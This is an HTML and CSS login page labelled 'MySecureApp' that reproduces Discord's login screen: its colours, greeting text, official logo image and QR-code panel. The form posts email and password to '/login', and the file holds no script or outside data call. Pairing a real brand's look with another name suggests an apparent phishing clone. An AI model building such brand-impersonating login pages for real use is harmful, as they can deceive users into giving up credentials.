<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login â€“ MySecureApp</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background-color: #313338;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-image: url('https://i.imgur.com/RsK7xy2.jpg');
      background-size: cover;
      background-position: center;
    }

    .container {
      background-color: #2f3136;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
      display: flex;
      overflow: hidden;
      max-width: 800px;
      width: 100%;
      margin: 20px;
    }

    .left, .right {
      flex: 1;
      padding: 40px 30px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .left h2 {
      color: white;
      margin-bottom: 8px;
      font-size: 24px;
    }

    .left p {
      color: #b9bbbe;
      font-size: 14px;
      margin-bottom: 20px;
    }

    label {
      font-size: 12px;
      color: #b9bbbe;
      margin-bottom: 5px;
      display: block;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 4px;
      background-color: #1e1f22;
      color: white;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #5865f2;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      margin-top: 10px;
      cursor: pointer;
    }

    button:hover {
      background-color: #4752c4;
    }

    .left a {
      font-size: 12px;
      color: #00a8fc;
      text-decoration: none;
      margin-bottom: 20px;
    }

    .left .footer {
      font-size: 12px;
      text-align: center;
      margin-top: 20px;
    }

    .left .footer a {
      color: #00a8fc;
    }

    .right {
      background-color: #2b2d31;
      align-items: center;
      text-align: center;
    }

    .right img {
      width: 140px;
      height: 140px;
      border-radius: 8px;
      margin-bottom: 15px;
    }

    .right h3 {
      color: white;
      margin: 0 0 10px;
      font-size: 16px;
    }

    .right p {
      color: #b9bbbe;
      font-size: 12px;
      max-width: 220px;
    }

    /* Mobile View Styling */
    @media (max-width: 768px) {
      body {
        background: #313338;
        padding: 20px;
      }

      .container {
        flex-direction: column;
        background: #2f3136;
        box-shadow: none;
        padding: 0;
      }

      .right {
        display: none;
      }

      .left {
        padding: 30px 20px;
      }

      .mobile-logo {
        display: block;
        width: 160px;
        margin: 0 auto 20px;
      }
    }

    /* Desktop logo is hidden by default */
    .mobile-logo {
      display: none;
    }
  </style>
</head>
<body>

  <div class="container">

    <div class="left">
      <!-- Mobile logo (only visible on mobile) -->
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Discord_colour_textlogo_%282021%29.svg/1200px-Discord_colour_textlogo_%282021%29.svg.png"
        alt="Discord Logo" class="mobile-logo" />

      <h2>Welcome back!</h2>
      <p>We're so excited to see you again!</p>

      <form method="POST" action="/login">
        <label for="email">EMAIL OR PHONE NUMBER *</label>
        <input type="email" name="email" id="email" required>

        <label for="password">PASSWORD *</label>
        <input type="password" name="password" id="password" required>

        <a href="#">Forgot your password?</a>

        <button type="submit">Log In</button>
      </form>

      <div class="footer">
        Need an account? <a href="#">Register</a>
      </div>
    </div>

    <div class="right">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ1wPG5Hw_GtnyedH8VWglMcG5da1m0hjzae5gg7VOPgTZ_WxNcLkimtnU_&s=10"
        alt="QR Code" />
      <h3>Log in with QR Code</h3>
      <p>Scan this with the MySecureApp mobile app to log in instantly.</p>
    </div>

  </div>

</body>
</html>
